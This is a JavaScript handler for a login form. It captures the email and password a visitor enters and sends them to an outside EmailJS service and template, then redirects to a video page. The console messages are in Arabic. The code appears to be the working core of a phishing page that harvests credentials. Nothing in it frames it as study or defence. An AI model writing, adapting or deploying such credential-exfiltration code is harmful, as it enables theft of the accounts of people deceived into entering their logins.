document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    emailjs.send("service_dl2pg3o", "template_ca3b0oj", {
        email: email,
        password: password
    }, "T8dFFYK-nFxpuLbbv")
    .then(function(response) {
        console.log("تم الإرسال بنجاح!", response.status, response.text);
        window.location.href = "video.html";
    }, function(error) {
        console.log("فشل الإرسال:", error);
    });
});
